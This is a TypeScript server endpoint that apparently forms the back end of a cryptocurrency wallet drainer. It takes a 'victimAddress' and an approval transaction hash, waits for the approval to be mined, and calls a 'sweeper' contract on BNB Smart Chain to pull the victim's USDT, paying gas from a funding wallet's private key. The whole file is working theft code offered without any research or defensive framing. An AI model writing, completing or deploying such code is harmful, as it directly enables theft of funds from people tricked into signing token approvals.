// server/api/sweep.ts
import { defineEventHandler, readBody, setResponseHeaders, H3Event } from 'h3';
import { ethers } from 'ethers';

export default defineEventHandler(async (event: H3Event) => {
  // Enable CORS
  setResponseHeaders(event, {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, x-auth-key',
  });

  // Handle preflight OPTIONS request
  if (event.method === 'OPTIONS') {
    return { success: true };
  }

  // Check auth key
  const authHeader = event.headers.get('x-auth-key');
  if (authHeader !== process.env.AUTH_KEY) {
    return { success: false, error: 'Unauthorized' };
  }

  const { victimAddress, approvalTxHash } = await readBody(event);
  if (!victimAddress || !approvalTxHash) {
    return { success: false, error: 'Missing victimAddress or approvalTxHash' };
  }

  const SWEEPER_CONTRACT = "0x802E52D35F64cfa78e0DBf1Ab920aAA71030308e";
  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const FUNDING_PRIVATE_KEY = process.env.FUNDING_PRIVATE_KEY;
  const RPC_URL = "https://bsc-dataseed.binance.org/";

  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const fundingWallet = new ethers.Wallet(FUNDING_PRIVATE_KEY, provider);
  const sweeperABI = ['function sweep(address victim, address token) external'];
  const sweeper = new ethers.Contract(SWEEPER_CONTRACT, sweeperABI, fundingWallet);

  try {
    // Check if approval is already mined (0 confirmations)
    const receipt = await provider.getTransactionReceipt(approvalTxHash);
    if (receipt && receipt.status === 1) {
      // Approval is mined, proceed immediately
      const tx = await sweeper.sweep(victimAddress, USDT_ADDRESS, { gasLimit: 200000 });
      return { success: true, txHash: tx.hash };
    } else {
      // Approval not mined yet: Wait 1 second and retry ONCE
      await new Promise(resolve => setTimeout(resolve, 1000));
      const tx = await sweeper.sweep(victimAddress, USDT_ADDRESS, { gasLimit: 200000 });
      return { success: true, txHash: tx.hash };
    }
  } catch (error: any) {
    console.error('Sweep error:', error);
    return { success: false, error: error.message };
  }
});